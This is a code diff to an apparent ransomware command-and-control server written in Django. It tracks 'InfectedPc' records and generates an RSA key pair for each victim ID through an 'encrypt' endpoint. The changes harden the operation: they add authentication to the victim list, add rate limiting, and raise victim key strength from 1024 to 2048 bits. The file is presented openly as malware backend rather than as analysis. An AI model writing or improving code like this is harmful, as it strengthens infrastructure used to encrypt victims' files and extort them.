@@ -11,7 +11,7 @@ from rest_framework.views import status
 from django.shortcuts import render
 from .forms import decryptForm
 from rest_framework.decorators import api_view, renderer_classes
-
+from ratelimit.decorators import ratelimit
 from Crypto.PublicKey import RSA
 
 
@@ -21,13 +21,15 @@ class ListInfectedPcView(generics.ListAPIView):
     """
     queryset = InfectedPc.objects.all()
     serializer_class = InfectedPcSerializer
-    #permission_classes = (permissions.IsAuthenticated,)
+    permission_classes = (permissions.IsAuthenticated,)
+@ratelimit(key='ip')
+@ratelimit(key='post:uniqueId', rate='5/m')
 @api_view(('POST','GET'))
 def encrypt(request):
     if request.method == 'POST':
-        if request.data['uniqueId'] is not None:
+        if 'uniqueId' in request.data:
             if not InfectedPc.objects.filter(uniqueId = request.data['uniqueId']).exists():
-                key = RSA.generate(1024)
+                key = RSA.generate(2048)
                 privateKey = key.export_key()
                 publicKey = key.publickey().export_key()
                 InfectedPc.objects.create(
